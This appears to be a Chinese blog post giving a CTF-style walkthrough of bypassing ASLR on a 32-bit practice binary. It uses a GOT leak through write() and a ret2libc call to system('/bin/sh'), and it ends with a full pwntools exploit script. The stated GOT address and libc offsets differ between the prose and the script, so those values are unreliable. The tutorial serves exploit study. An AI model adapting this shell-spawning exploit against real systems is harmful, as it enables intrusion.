<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>Pwn(绕过ASLR) | 过客</title>
<meta name="description" content="this is a test Web">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582522919509">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>

<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />



  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://guokeya.github.io">
        <img src="https://guokeya.github.io/images/avatar.png?v=1582522919509" class="site-logo">
        <h1 class="site-title">过客</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            首页
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            归档
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            关于
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            分类
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      this is a test Web
    </div>
    <div class="site-footer">
       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">Pwn(绕过ASLR)</h2>
            <div class="post-date">2020-01-09</div>
            
            <div class="post-content">
              <p><strong>关于ASLR</strong><br>
ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。<br>
但是，地址随机化不是对所有模块和内存区都进行随机化！</p>
<!-- more -->
<p><strong>分析程序</strong><br>
<img src="https://guokeya.github.io/post-images/1578558025062.png" alt="" loading="lazy"><br>
<img src="https://guokeya.github.io/post-images/1578558063767.png" alt="" loading="lazy"><br>
首先main函数调用了vulnerable_function，读取了256个字节。放入128字节大小的栈内<br>
write(1,&quot;hello world&quot;,13)，第一个参数是文件描述符，为1的时候。将会打印出hello world<br>
很明显的栈溢出问题。但是由于这里开启了ASLR。栈内的地址都是会变化的<br>
当我们使用之前的来利用脚本。将静态的地址写入脚本时。就不能达到想要的效果<br>
<strong>延时绑定</strong><br>
这个涉及到GOT/PLT表</p>
<pre><code>read(0,&amp;buf,0xu)
</code></pre>
<p>当程序第一次执行。遇到read时。它不知道read函数的地址。就会去plt表里面找函数地址。而plt表中存放的是got表的地址。<br>
简单来说。就是plt表存got表地址。got表存函数地址。plt表就是个中间商<br>
对应关系如下图<br>
<img src="https://guokeya.github.io/post-images/1578567666307.png" alt="" loading="lazy"><br>
当程序第二次遇到read函数的时候。由于第一次已经通过plt-&gt;got-&gt;查找到函数地址了。第二次以后就会直接去got表里面取函数地址。不用经过plt表<br>
如图。这里程序还没运行时，plt表内read函数的地址是0x8048350<br>
<img src="https://guokeya.github.io/post-images/1578567354224.png" alt="" loading="lazy"><br>
接下来看看这个地址到底存放的是什么。<br>
由于plt表实质上是个跳转指令。所以用pdisass查看<br>
<img src="https://guokeya.github.io/post-images/1578568093321.png" alt="" loading="lazy"><br>
从图中我们可以看到这个read@plt的函数地址对应着plt表中<code>jmp DWORD PTR ds:0x804a00c</code>这一行指令<br>
也就是说。0x804a00c才是真正的read函数地址。但是当第二次执行的时候。地址就会变化<br>
<strong>解题思路</strong><br>
理一下我们现有的条件<br>
1：有read函数。可以输入造成溢出<br>
2：有write函数。可以当做输出使用</p>
<pre><code>由于这里没有canary保护可以溢出。问题就在于变化的地址
而这里有write函数。可以输出。那么我们是否可以溢出read函数。覆盖eip为write函数地址。通过类似于ret2lib的方式构造write函数。将真实地址打印出来
</code></pre>
<pre><code>由于ASLR只改变地址。函数中相对的地址是不变的。比如system函数地址是在0x5。read函数在0x10
改变地址后。system函数在0x15，read函数在0x20，两者的偏移量永远不变。
</code></pre>
<pre><code>当我们知道了write函数打印出来的read函数的真实地址。再在GDB里调试。知道两者的相对偏移
那么真实地址+偏移。就得到了system函数的真实地址
同理。可以得到/bin/sh字符串地址
</code></pre>
<p><strong>开始构造:</strong><br>
首先。我们测出覆盖eip需要多少个字节。得到132<br>
<img src="https://guokeya.github.io/post-images/1578570101498.png" alt="" loading="lazy"><br>
<strong>下面开始输出函数的真实地址</strong></p>
<pre><code>write(1,read函数地址,读取四个字节)
payload=&quot;A&quot;*132+p32(0x8048380)+p32(0x080484ab)+&quot;\x01\x00\x00\x00&quot;+p32(0x804a00c)+&quot;\x04\x00\x00\x00&quot;
         溢出   write函数plt地址    返回地址       参数一        参数二          参数三
</code></pre>
<p>write函数PLT地址。read函数GOT地址怎么找呢。<br>
注意要在没有运行程序的时候。查找。<br>
<img src="https://guokeya.github.io/post-images/1578572338083.png" alt="" loading="lazy"><br>
注意这里的返回地址。是write函数执行完后的返回地址。我填的是vulnerable_function的地址。由于程序退出才算正常执行。地址才会变换。那么我们输出真实地址以后。返回到存在栈溢出的函数。再进行溢出。这时候我们已经知道了真实地址。直接覆盖eip就完事了<br>
后面几个参数都是对应write函数的参数x<br>
为什么write函数参数要填got表地址呢。因为got表地址中存的才是真正地址。ASLR只会改变栈。函数地址。并不会改变GOT表这个地址</p>
<pre><code>PLT-&gt;GOT&gt;函数地址
PLT和GOT表地址不变。变得是GOT表中存的数据。当我们从GDB中调试。将函数GOT表地址通过write函数输出时。GOT表地址不变。在脚本中可行。GOT表对应的函数真正地址变化。我们通过write输出GOT表中的值。就得到了每次变化的地址
</code></pre>
<p>read函数执行前<br>
<img src="https://guokeya.github.io/post-images/1578572253303.png" alt="" loading="lazy"><br>
read函数执行后。地址变化了<br>
<img src="https://guokeya.github.io/post-images/1578572272014.png" alt="" loading="lazy"><br>
得到了地址。我们接收处理</p>
<pre><code>a=p.recv()
a=unpack(a)
</code></pre>
<p><strong>算出偏移量。</strong><br>
由于偏移量都不会变。那么我们在main下断点运行程序。从这一次的随机化地址开始算偏移<br>
由于。我们之前write函数参数填的是read函数的GOT地址。输出的是read函数的真实地址。那么这里就要算read函数和system函数的偏移。别输出read函数。算的是write函数和system函数的偏移<br>
<img src="https://guokeya.github.io/post-images/1578572605200.png" alt="" loading="lazy"><br>
得到system函数=真实地址+0x99a10<br>
然后计算/bin/sh偏移<br>
<img src="https://guokeya.github.io/post-images/1578572729291.png" alt="" loading="lazy"><br>
/bin/sh=真实地址+0x84cdb<br>
<strong>最后溢出getshell</strong><br>
为什么程序执行完一次还能继续输出呢。因为第一次输出。我们覆盖EIP。修改返回地址填的是有溢出漏洞的那个函数地址。程序执行完read(0,&amp;buf,0x100u)(这个函数已经被我们溢出为write函数了)输出了真实地址。就跳到返回地址去了<br>
所以又执行了一次read(0,&amp;buf,0x100u),这一次。我们有了system函数地址。/bin/sh字符串地址<br>
直接覆盖getshell</p>
<pre><code>p.sendline(&quot;A&quot;*132+p32(system)+&quot;BBBB&quot;+p32(binsh))
</code></pre>
<p>完整利用脚本</p>
<pre><code>from pwn import *
write_plt=0x8048380
read_got=0x804a018
payload1=&quot;A&quot;*132+p32(write_plt)+p32(0x080484ab)+&quot;\x01\x00\x00\x00&quot;+p32(read_got)+&quot;\x04\x00\x00\x00&quot;
p=process('./aslr')
p.sendline(payload1)
a=p.recv()
a=unpack(a)
#真实地址
sysaddr=a-0x99a80
#真实地址+偏移
binsh=a+0x84c6b
#真实地址+偏移
p.sendline(&quot;A&quot;*132+p32(sysaddr)+&quot;BBBB&quot;+p32(binsh))
#溢出+system函数地址+返回地址+字符串地址(参数)
p.interactive()
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1578573222514.png" alt="" loading="lazy"></figure>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://guokeya.github.io/tag/Pwn/" class="tag">
                    Pwn
                  </a>
                
              </div>
            
            
              <div class="next-post">
                <div class="next">下一篇</div>
                <a href="https://guokeya.github.io/post/vj4GJHsC-/">
                  <h3 class="post-title">
                    [ISITDTU 2019]EasyPHP(无数字字母Webshell进阶)
                  </h3>
                </a>
              </div>
            

            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

<script type="application/javascript">

AOS.init();

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
